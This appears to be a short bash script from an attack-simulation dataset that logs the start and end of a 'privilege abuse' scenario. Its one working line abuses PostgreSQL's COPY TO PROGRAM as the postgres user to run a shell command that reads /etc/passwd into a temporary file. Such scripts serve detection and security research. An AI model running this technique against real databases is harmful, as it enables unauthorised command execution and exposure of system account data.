#!/bin/bash
echo "Simulating Privilege Abuse Attack (cat_passwd)..."
/dataset_workspace/logger.sh mark_attack "attack_priv_cat_passwd" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'cat /etc/passwd > /tmp/out_cat_passwd.txt 2>/dev/null || true';"
/dataset_workspace/logger.sh mark_attack "attack_priv_cat_passwd" end
